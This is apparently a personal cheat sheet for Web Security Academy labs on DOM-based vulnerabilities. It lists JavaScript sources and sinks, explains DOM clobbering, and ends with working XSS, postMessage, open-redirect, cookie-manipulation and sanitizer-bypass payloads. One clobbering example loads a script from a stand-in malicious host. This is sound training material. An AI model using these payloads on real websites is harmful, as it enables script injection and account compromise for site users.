## Common sources & sinks
```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

**JS**
```
eval()
Function()
setTimeout()
setInterval()
setImmediate()
execCommand()
execScript()
msSetImmediate()
range.createContextualFragment()
crypto.generateCRMFRequest()
```
**Link manipulation**
```
element.href
element.src
element.action
```

**Web messages**
```
postMessage()
```

**AJAX**
```
XMLHttpRequest.setRequestHeader()
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.globalEval()
$.globalEval()
```

**Local files manipulation**
```
FileReader.readAsArrayBuffer()
FileReader.readAsBinaryString()
FileReader.readAsDataURL()
FileReader.readAsText()
FileReader.readAsFile()
FileReader.root.getFile()
```

**Storage**
```
sessionStorage.setItem()
localStorage.setItem()
```

**XPATH**
```
document.evaluate()
element.evaluate()
```

**JSON injections**
```
JSON.parse()
jQuery.parseJSON()
$.parseJSON()
```

**DOM data**
```
script.src
script.text
script.textContent
script.innerText
element.setAttribute()
element.search
element.text
element.textContent
element.innerText
element.outerText
element.value
element.name
element.target
element.method
element.type
element.backgroundImage
element.cssText
element.codebase
document.title
document.implementation.createHTMLDocument()
history.pushState()
history.replaceState()
```
**DoS**
```
requestFileSystem()
RegExp()
```
### Sinks for open redirect vulns
```
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```
### DOM-clobbering
A common pattern used by JavaScript developers is:
```
var someObject = window.someObject || {};
```
If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as 
an anchor. Consider the following code:
```js
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```
To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an 
anchor element:
```<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>```

Another common technique is to use a form element along with an element such as input to clobber DOM properties:

```<form onclick=alert(1)><input id=attributes>Click me```

Because the attributes property has been clobbered with the input element, the filter loops through the input 
element instead. As the input element has an undefined length, the conditions for the for loop of the filter (for 
example i<element.attributes.length) are not met, and the filter simply moves on to the next element instead. This 
results in the  onclick event being ignored altogether by the filter, which subsequently allows the alert() function 
to be called in the browser.



## LAB payloads
```
# DOM XSS using web messages
--> find that addEventListener() call that listens for a web message
<iframe src="https://...web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()
>','*')">

# DOM XSS using web messages and a JavaScript URL
--> addEventListener() + indexOf() (which checks that looks for the strings "http:" or "https:" anywhere within the web 
message)
<iframe src="https://...web-security-academy.net/?" onload="this.contentWindow.postMessage('javascript:print
(%22https:%22)','*')">

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

# DOM XSS using web messages and JSON.parse
--> JSON.parse() + load-channel + iframe src
<iframe src="https://...web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",
\"url\":\"javascript:print()\"}","*")'>

# DOM-based open redirection
--> look at post page and find vulnerable script, send url param inside url
https://...web-security-academy.net/post?postId=5&url=https://exploit-...exploit-server.
net/exploit

# DOM-based cookie manipulation
--> find script on product page, there is last viewed link on all pages, breake the anchore tag
'><script>print()</script>
--> find that windows.location takes raw url, so it is possible to add some params to valid url and trigger XSS
&xss='><script>print()</script>
<iframe src="https://...web-security-academy.net/product?productId=19&xss=%27%3E%3Cscript%3Eprint()%3C/script%3E" 
onload=window.location.replace("https://...web-security-academy.net/")>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if
(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">

# Exploiting DOM clobbering to enable XSS
--> The page for a specific blog post imports the JavaScript file loadCommentsWithDomClobbering.js, which contains 
the following code:
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
--> Creating two anchors with the same ID causes them to be grouped in a DOM collection. The name attribute in the 
second anchor contains the value "avatar", which will clobber the avatar property with the contents of the href 
attribute
--> DOMPurify allows you to use the cid: protocol, which does not URL-encode double-quotes.
<a id=defaultAvatar><a id=defaultAvatar name=avatar href='cid:&#x22;onerror=alert(1)//'>

# Clobbering DOM attributes to bypass HTML filters
--> lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering.
--> The library uses the attributes property to filter HTML attributes
--> after a 500ms delay, iframe adds the #x fragment to the end of the page URL (delay is to ensure the commend with 
injection is loaded)
<form id=x tabindex=0 onfocus=alert(1)><input id=attributes> - add to comment
<iframe src=https://...web-security-academy.net/post?postId=10 onload="setTimeout(()=>this.src=this.src+'#x',500)">

--> alert might not work, use print
<form id=x tabindex=0 onfocus=print(1)><input id=attributes> - add to comment
<iframe src=https://...web-security-academy.net/post?postId=8 onload="setTimeout(()=>this.src=this.src+'#x',500)">


























```